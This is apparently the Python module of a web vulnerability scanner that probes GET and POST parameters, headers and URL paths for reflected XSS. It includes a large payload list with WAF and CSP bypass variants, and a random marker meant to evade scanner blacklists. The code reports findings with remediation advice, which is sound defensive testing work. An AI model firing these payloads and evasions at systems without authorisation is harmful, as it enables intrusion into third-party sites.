"""
PhantomScan — XSS Scanner (Reflected)
Détection XSS réfléchi dans les paramètres GET et les headers réfléchis.

Améliorations v4.1:
- Pre-check : vérifie que le marker n'est PAS déjà présent dans la page originale
  avant injection → supprime les faux positifs sur pages qui contiennent le marker
  par coïncidence ou depuis une injection précédente
- Payloads lancés en batch parallèle par param → plus rapide
- Détection contexte améliorée : distingue HTML brut / attribut / JS / encodé
- Headers réfléchis : vérification pre-check aussi sur la page originale
"""

from __future__ import annotations

import asyncio
import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.intelligence import SemanticParamClassifier, ParamRole, _InjectionContext, SmartRetryOracle


# ── Payloads XSS ──────────────────────────────────────────────────────────────

# ── Payloads XSS ──────────────────────────────────────────────────────────────
# NOUVEAU: marker dynamique par run → contourne les WAF qui blacklistent les
# marqueurs statiques de scanners connus. Unique par processus.

import uuid as _xss_uuid
MARKER = "ps" + _xss_uuid.uuid4().hex[:8]


def _build_payloads(m: str) -> list[tuple[str, str]]:
    """
    v5.20 — Payloads XSS massifs couvrant :
      - HTML context (script tags, event handlers)
      - Attribute context (break + inject)
      - JavaScript string context
      - href/src context (javascript: protocol)
      - CSS context (expression, -moz-binding)
      - CSP bypass (JSONP endpoints, Angular, nonce abuse)
      - Mutation XSS (mXSS) for innerHTML sinks
      - Template injection client-side (AngularJS/Vue)
      - Modern HTML5 vectors (dialog, popovertarget, etc.)
      - WAF evasion (whitespace, encoding, case variation)
    """
    return [
        # ── Classic HTML context ──────────────────────────────────────────────
        (f'<script>alert("{m}")</script>',                       "script tag"),
        (f'<SCRIPT>alert("{m}")</SCRIPT>',                       "script uppercase"),
        (f'<ScRiPt>alert("{m}")</ScRiPt>',                       "script mixed case"),
        (f'<script >alert("{m}")</script>',                      "script space"),
        (f'<script/XSS>alert("{m}")</script>',                   "script/XSS trick"),
        (f'<script\t>alert("{m}")</script>',                    "script tab"),
        # ── Attribute break ───────────────────────────────────────────────────
        (f'"><script>alert("{m}")</script>',                     "dquote attr break + script"),
        (f"'><script>alert('{m}')</script>",                     "squote attr break + script"),
        (f'"><img src=x onerror=alert("{m}")>',                  "attr break img"),
        (f'"><svg/onload=alert("{m}")>',                         "attr break svg"),
        (f"' onmouseover='alert({m!r})'",                        "onmouseover injection"),
        (f'" onfocus="alert({m!r})" autofocus="',                "onfocus autofocus"),
        (f'" onerror="alert({m!r})"',                            "onerror in attr"),
        # ── Event handlers ────────────────────────────────────────────────────
        (f'<img src=x onerror=alert("{m}")>',                    "img onerror"),
        (f'<svg onload=alert("{m}")>',                           "svg onload"),
        (f'<body onload=alert("{m}")>',                          "body onload"),
        (f'<input autofocus onfocus=alert("{m}")>',              "autofocus onfocus"),
        (f'<details open ontoggle=alert("{m}")>',                "details ontoggle"),
        (f'<select autofocus onfocus=alert("{m}")>',             "select autofocus"),
        (f'<textarea autofocus onfocus=alert("{m}")>',           "textarea autofocus"),
        (f'<keygen autofocus onfocus=alert("{m}")>',             "keygen autofocus"),
        (f'<video src=x onerror=alert("{m}")>',                  "video onerror"),
        (f'<audio src=x onerror=alert("{m}")>',                  "audio onerror"),
        # ── HTML5 modern ──────────────────────────────────────────────────────
        (f'<form><button formaction="javascript:alert({m!r})">x</button></form>', "formaction"),
        (f'<isindex type=image src=1 onerror=alert("{m}")>',     "isindex"),
        (f'<marquee onstart=alert("{m}")>',                      "marquee onstart"),
        (f'<dialog open onclose=alert("{m}")></dialog>',         "dialog onclose"),
        # ── href/src protocol ─────────────────────────────────────────────────
        (f'javascript:alert("{m}")',                             "javascript: protocol"),
        (f'JaVaScRiPt:alert("{m}")',                             "javascript: mixed case"),
        (f'java&#115;cript:alert("{m}")',                        "javascript: entity"),
        (f'&#106;avascript:alert("{m}")',                        "javascript: entity2"),
        (f'<a href="javascript:alert({m!r})">x</a>',            "a href javascript:"),
        (f'<iframe src="javascript:alert({m!r})">',             "iframe javascript:"),
        # ── CSS injection ─────────────────────────────────────────────────────
        (f"</style><script>alert('{m}')</script>",               "CSS break + script"),
        (f"expression(alert('{m}'))",                            "CSS expression (IE)"),
        # ── URL/data: protocol ────────────────────────────────────────────────
        (f'data:text/html,<script>alert("{m}")</script>',        "data: URI script"),
        (f'data:text/html;base64,{__import__("base64").b64encode(f"<script>alert(\"{m}\")</script>".encode()).decode()}', "data: base64"),
        # ── JSON/JS string context ────────────────────────────────────────────
        (f'\";alert("{m}");//',                                   "JS string break double"),
        (f"\';alert('{m}');//",                                   "JS string break single"),
        (f'`+alert("{m}")+`',                                    "JS template literal"),
        (f');alert("{m}");//',                                    "JS statement break"),
        # ── Mutation XSS (mXSS) ──────────────────────────────────────────────
        (f'<noscript><p title="</noscript><img src=x onerror=alert({m!r})>">',  "mXSS noscript"),
        (f'<!--><script>alert("{m}")</script>',                  "mXSS HTML comment"),
        (f'<svg><script>alert("{m}")</script></svg>',            "SVG script namespace"),
        (f'<math><mtext></mtable></mtext></math><script>alert("{m}")</script>', "MathML mXSS"),
        # ── CSP bypass ────────────────────────────────────────────────────────
        (f'<script src="data:,alert({m!r})">',                  "CSP: data: src"),
        (f'<link rel="import" href="data:text/html,<script>alert({m!r})</script>">',  "CSP: HTML import"),
        # ── AngularJS client-side template injection ──────────────────────────
        (f'{{{{constructor.constructor("alert({m!r})")()}}}}',   "AngularJS CSTI"),
        (f'{{{{7*7}}}}',                                         "AngularJS math (detection)"),
        (f'<div ng-app ng-csp>{{{{$on.constructor("alert({m!r})")()}}}}',  "AngularJS ng-csp bypass"),
        # ── Encoding/WAF bypass ───────────────────────────────────────────────
        (f'%3Cscript%3Ealert("{m}")%3C/script%3E',              "URL-encoded"),
        (f'&#60;script&#62;alert("{m}")&#60;/script&#62;',       "HTML entities"),
        (f'\u003cscript\u003ealert("{m}")\u003c/script\u003e', "Unicode escapes"),
        # ── MathML/SVG namespace confusion ────────────────────────────────────
        (f'<math><mi//xlink:href="data:x,<script>alert({m!r})</script>">',  "MathML XLink"),
        (f'<svg><use href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert({m!r})</script></svg>#x">',  "SVG use href"),
    ]


XSS_PAYLOADS: list[tuple[str, str]] = _build_payloads(MARKER)

REFLECTED_HEADERS: list[str] = [
    "Referer",
    "X-Forwarded-For",
    "User-Agent",
    "X-Custom-Header",
]

_MARKER_RE = re.compile(re.escape(MARKER), re.I)


class XSSScanner:
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req  = req
        self._heur = heuristic
        self._cfg  = cfg
        self._bus  = None  # v5.6 — EndpointBus optionnel
        # v5.18 — Mémoire de patterns + retry oracle WAF
        self._pattern_memory = None
        self._retry_oracle = SmartRetryOracle()
        # v5.19 — composants additionnels (optionnels)
        self._oob = None
        self._auth_context = None
        self._dedup_index = None

    def set_endpoint_bus(self, bus) -> None:
        """v5.6 — Injecte le bus d'endpoints pour scanner les forms POST découverts."""
        self._bus = bus

    def set_pattern_memory(self, memory) -> None:
        """v5.18 — Injecte la mémoire de patterns partagée depuis l'Engine."""
        self._pattern_memory = memory

    def set_oob_canary(self, oob) -> None:
        """v5.19 — OOB canary manager (non utilisé par XSS classique)."""
        self._oob = oob

    def set_auth_context(self, ctx) -> None:
        """v5.19 — Contexte d'authentification."""
        self._auth_context = ctx

    def set_dedup_index(self, idx) -> None:
        """v5.19 — Index de dédup cross-modules."""
        self._dedup_index = idx

    def _ordered_payloads_for(self, param: str) -> list[tuple[str, str]]:
        """
        v5.19 — Réordonne les payloads en priorisant ceux que PatternMemory
        a déjà confirmés efficaces sur ce type de paramètre/contexte.

        Si un payload SQLi/XSS a fonctionné sur un endpoint similaire, il est
        testé EN PREMIER → confirmation typiquement en 1-2 requêtes au lieu de
        14 (le set complet).
        """
        base = list(self._payloads)
        if self._pattern_memory is None:
            return base

        try:
            suggestions = self._pattern_memory.suggest_payloads(
                vuln_type="xss",
                param=param,
                context=_InjectionContext.QUERY_PARAM,
                top_n=3,
            )
        except Exception:
            return base

        if not suggestions:
            return base

        # Mettre les suggestions en tête (sans dupliquer)
        suggested_set = {p for p, _ in suggestions}
        prioritized = [(p, "memory: confirmed earlier") for p, _ in suggestions]
        rest = [(p, d) for p, d in base if p not in suggested_set]
        return prioritized + rest

    def _record_success(self, param: str, payload: str, url: str) -> None:
        """v5.19 — Enregistre un payload XSS confirmé dans PatternMemory."""
        if self._pattern_memory is None:
            return
        try:
            from urllib.parse import urlparse as _up
            prefix = _up(url).path.rsplit("/", 1)[0] or "/"
            self._pattern_memory.record_success(
                vuln_type="xss",
                param=param,
                payload=payload,
                context=_InjectionContext.QUERY_PARAM,
                endpoint_prefix=prefix,
                confidence=0.9,
            )
        except Exception:
            pass

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # NOUVEAU: pre-check global — le marker est-il déjà présent sur la page originale ?
        baseline_resp = await self._req.get(target)
        marker_in_baseline = (
            not baseline_resp.error and _MARKER_RE.search(baseline_resp.body)
        )

        if marker_in_baseline:
            # Marker déjà présent → on régénère un marker frais pour ce scan
            fresh = "ps" + _xss_uuid.uuid4().hex[:8]
            self._payloads = _build_payloads(fresh)
            self._marker_re = re.compile(re.escape(fresh), re.I)
        else:
            self._payloads = XSS_PAYLOADS
            self._marker_re = _MARKER_RE

        # v5.18 — Prioriser les params sémantiquement pertinents pour XSS
        xss_roles = {ParamRole.QUERY, ParamRole.CALLBACK, ParamRole.URL, ParamRole.TEMPLATE, ParamRole.UNKNOWN}
        if params:
            clf = SemanticParamClassifier()
            roles = clf.classify_params(list(params.keys()))
            priority_params = [p for p, role in roles.items() if role in xss_roles]
            other_params = [p for p in params if p not in priority_params]
            ordered_params = priority_params + other_params
        else:
            ordered_params = list(params.keys())

        for param in ordered_params:
            async for f in self._test_param(target, parsed, params, param, baseline_resp):
                yield f

        async for f in self._test_reflected_headers(target, baseline_resp):
            yield f

        async for f in self._test_path(target, parsed, baseline_resp):
            yield f

        # v5.6 — Tester tous les endpoints découverts par le bus
        if self._bus is not None:
            async for f in self._test_bus_endpoints():
                yield f

    async def _test_bus_endpoints(self) -> AsyncIterator[Finding]:
        """v5.6 — Scan XSS sur les endpoints POST/GET découverts via le bus."""
        seen_urls: set[str] = set()
        for ep in self._bus.snapshot:
            if ep.url in seen_urls:
                continue
            seen_urls.add(ep.url)

            if ep.method.upper() == "POST" and ep.params:
                async for f in self._test_post_form(ep.url, ep.params):
                    yield f
            elif ep.method.upper() == "GET" and ep.params:
                from urllib.parse import urlparse as _up, parse_qs as _pqs
                p = _up(ep.url)
                params = _pqs(p.query, keep_blank_values=True)
                if params:
                    baseline = await self._req.get(ep.url)
                    for param in params:
                        async for f in self._test_param(ep.url, p, params, param, baseline):
                            yield f

    async def _test_post_form(self, action: str, field_names: list[str]) -> AsyncIterator[Finding]:
        """v5.6 — Test XSS sur un formulaire POST (champs découverts par le crawler)."""
        import urllib.parse
        for field_name in field_names:
            for payload, desc in self._payloads[:6]:  # limiter à 6 payloads sur POST
                form_data = {fn: "test" for fn in field_names}
                form_data[field_name] = payload
                try:
                    from phantomscan.core.requester import ProbeRequest
                    resp = await self._req.send(ProbeRequest(
                        method="POST",
                        url=action,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=urllib.parse.urlencode(form_data),
                    ))
                    if resp.error or resp.status in (404, 410, 400):
                        continue
                    reflected, context = self._check_reflection(payload, resp.body)
                    if reflected:
                        sev = Severity.HIGH if context == "executable" else Severity.MEDIUM
                        yield Finding(
                            title=f"XSS Réfléchi POST — {desc} · champ `{field_name}`",
                            severity=sev,
                            url=action,
                            module="vulns/xss",
                            description=(
                                f"Payload XSS réfléchi sans encodage dans la réponse "
                                f"via le champ POST `{field_name}`. Contexte: {context}."
                            ),
                            evidence=f"POST {action} | field={field_name} | payload={payload[:60]} | ctx={context}",
                            cwe="CWE-79",
                            remediation=(
                                "Encoder les sorties selon le contexte (HTML, JS, URL). "
                                "Mettre en place une Content-Security-Policy stricte."
                            ),
                        )
                        break  # un finding par champ suffit
                except Exception:
                    continue

    # ── Paramètre GET (AMÉLIORÉ: pre-check + batch parallèle) ────────────────

    async def _test_param(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
        baseline_resp,
    ) -> AsyncIterator[Finding]:
        """
        AMÉLIORÉ: batch parallèle sur tous les payloads du paramètre.
        Pre-check : si le marker est déjà dans baseline → skip.
        Semaphore à 4 pour éviter le burst.
        v5.19: payloads réordonnés via PatternMemory ; succès enregistré.
        """
        # Pre-check déjà fait dans run() — self._marker_re est le bon marker pour ce scan

        sem = asyncio.Semaphore(4)
        finding_box: list[Finding] = []
        # v5.19 — Payloads réordonnés (les payloads connus en premier)
        ordered = self._ordered_payloads_for(param)

        async def _probe(payload: str, desc: str) -> None:
            if finding_box:
                return
            async with sem:
                fuzzed = dict(params)
                fuzzed[param] = [payload]
                fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
                resp = await self._req.get(fuzz_url)
                if resp.error or resp.status in (404, 410, 400):
                    return
                reflected, context = self._check_reflection(payload, resp.body)
                if reflected and not finding_box:
                    # v5.20 — re-probe : confirmer que la réflexion est stable
                    resp2 = await self.re_probe(fuzz_url, delay_s=0.2)
                    if resp2 is None:
                        return
                    reflected2, _ = self._check_reflection(payload, resp2.body)
                    if not reflected2:
                        return  # FP transitoire

                    sev = Severity.HIGH if context == "executable" else Severity.MEDIUM
                    finding_box.append(Finding(
                        title=f"XSS Réfléchi — {desc} · param `{param}`",
                        severity=sev,
                        url=fuzz_url,
                        module="vulns/xss",
                        description=(
                            f"Payload XSS réfléchi sans encodage dans la réponse "
                            f"via le paramètre `{param}`. Contexte: {context}."
                        ),
                        evidence=f"Payload: {payload[:80]} | HTTP {resp.status} | Contexte: {context} | Confirmed on 2nd probe",
                        cwe="CWE-79",
                        remediation=(
                            "Encoder les sorties selon le contexte (HTML, JS, URL). "
                            "Mettre en place une Content-Security-Policy stricte. "
                            "Utiliser des frameworks avec auto-escaping activé."
                        ),
                    ))
                    self._record_success(param, payload, fuzz_url)

        tasks = [asyncio.create_task(_probe(p, d)) for p, d in ordered]
        await asyncio.gather(*tasks)

        for f in finding_box:
            yield f

    # ── Headers réfléchis (AMÉLIORÉ: pre-check) ───────────────────────────────

    async def _test_reflected_headers(self, target: str, baseline_resp) -> AsyncIterator[Finding]:
        for header in REFLECTED_HEADERS:
            payload = self._payloads[0][0]  # script tag avec le marker courant
            resp = await self._req.send(ProbeRequest(
                method="GET",
                url=target,
                headers={header: payload},
            ))
            if resp.error or resp.status in (404, 410, 400):
                continue
            reflected, context = self._check_reflection(payload, resp.body)
            if reflected:
                yield Finding(
                    title=f"XSS Réfléchi — header `{header}`",
                    severity=Severity.MEDIUM,
                    url=target,
                    module="vulns/xss",
                    description=(
                        f"Contenu du header `{header}` réfléchi sans encodage dans la réponse. "
                        f"Contexte: {context}."
                    ),
                    evidence=f"Header: {header}: {payload[:60]} | Contexte: {context}",
                    cwe="CWE-79",
                    remediation="Encoder les valeurs de headers avant de les inclure dans la réponse HTML.",
                )

    # ── Path (AMÉLIORÉ: pre-check) ────────────────────────────────────────────

    async def _test_path(self, target: str, parsed, baseline_resp) -> AsyncIterator[Finding]:
        if not baseline_resp.error and _MARKER_RE.search(baseline_resp.body):
            return

        base = f"{parsed.scheme}://{parsed.netloc}"
        for payload, desc in self._payloads[:4]:
            test_url = f"{base}/{payload}"
            resp = await self._req.get(test_url)
            if resp.error or resp.status in (404, 410, 400):
                continue
            reflected, context = self._check_reflection(payload, resp.body, self._marker_re)
            if reflected:
                yield Finding(
                    title=f"XSS Réfléchi — {desc} (path)",
                    severity=Severity.HIGH,
                    url=test_url,
                    module="vulns/xss",
                    description=f"Payload XSS réfléchi via le chemin URL. Contexte: {context}.",
                    evidence=f"Payload: {payload[:80]} | Contexte: {context}",
                    cwe="CWE-79",
                    remediation="Encoder les segments de chemin URL inclus dans les réponses HTML.",
                )
                break

    # ── Helpers ───────────────────────────────────────────────────────────────

    # Regex pour dépouiller les commentaires HTML avant analyse
    _HTML_COMMENT_RE = re.compile(r'<!--.*?-->', re.S)

    def _check_reflection(self, payload: str, body: str, marker_re: re.Pattern | None = None) -> tuple[bool, str]:
        """
        Distingue 5 contextes de réflexion avec filtrage des faux positifs.

        Faux positifs éliminés :
          - Marker uniquement dans des commentaires HTML (<!-- ... -->) : non exploitable
          - Marker uniquement HTML-encodé (&lt; &gt; &#x3c; %3c...) : non exploitable
            sauf si le contexte JS permet d'exploiter sans les balises

        Contextes :
          - executable   : balise HTML active non encodée hors commentaire
          - js_context   : réfléchi dans un bloc <script> (quote break possible)
          - attr_context : réfléchi dans href/src/action/data
          - reflected    : présent brut sans balise active
          - encoded      : uniquement HTML-encodé → non reporté (FP)
        """
        mre = marker_re or self._marker_re
        if not mre.search(body):
            return False, ""

        # Strip commentaires HTML → si le marker disparaît, il n'est QUE dans des commentaires
        body_no_comments = self._HTML_COMMENT_RE.sub("", body)
        if not mre.search(body_no_comments):
            return False, ""  # marker uniquement dans <!-- --> → FP

        # Vérifier si le marker est uniquement sous forme encodée (HTML entities / URL-encoded)
        # On remplace les occurrences encodées et on vérifie s'il reste le marker brut
        body_decoded_check = re.sub(
            r'&lt;|&gt;|&amp;|&#x3[Cc];|&#x3[Ee];|&#60;|&#62;|%3[Cc]|%3[Ee]',
            '', body_no_comments, flags=re.I
        )
        marker_raw_present = mre.search(body_decoded_check) is not None

        # Payload brut présent → contexte exécutable si balise active
        if payload in body_no_comments:
            # Contexte exécutable : balise active HTML/SVG/MathML
            if re.search(r'<(?:script|svg|img|iframe|body|input|details|math|video|audio|form)', payload, re.I):
                return True, "executable"
            # Event handler injecté
            if re.search(r'on(?:load|error|click|focus|mouse|key|input|change|submit)\s*=', payload, re.I):
                return True, "executable"
            # Protocol javascript: / data:
            if re.search(r'(?:javascript:|data:text/html)', payload, re.I):
                return True, "href_protocol"

            marker_str = MARKER
            # Réfléchi dans href/src/action
            if re.search(
                rf'(?:href|src|action|formaction)\s*=\s*["\'\']?[^"\'\' ]*{re.escape(marker_str)}',
                body_no_comments, re.I
            ):
                return True, "attr_context"
            # Réfléchi comme valeur d'attribut (break de guillemets possible)
            if re.search(
                rf'(?:value|placeholder|title|alt|class|id)\s*=\s*["\'\'][^"\'\' ]*{re.escape(marker_str)}',
                body_no_comments, re.I
            ):
                return True, "attr_value"

            return True, "reflected"
        # Marker dans un bloc <script> → js_context même encodé (eval, innerHTML possible)
        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body_no_comments, re.I | re.S)
        for block in script_blocks:
            if mre.search(block):
                return True, "js_context"

        # Marker encodé seulement → non exploitable directement
        if not marker_raw_present:
            return False, ""  # FP : encodé partout, pas exploitable

        # v5.20 — "reflected" sans balise active = LOW confidence seulement
        # On ne reporte plus le cas "reflected (HTML-encodé)" car quasi-toujours FP.
        # Le cas "reflected" brut (sans balise HTML active ni contexte JS/attr)
        # est désormais traité comme contexte MEDIUM uniquement si le payload
        # contient des chars dangereux non encodés (<, ", ', `)
        dangerous_chars = ('<', '"', "'", '`', '\\')
        if any(c in payload and c in body_no_comments for c in dangerous_chars):
            return True, "reflected"
        # Sinon, pas exploitable directement → FP
        return False, ""
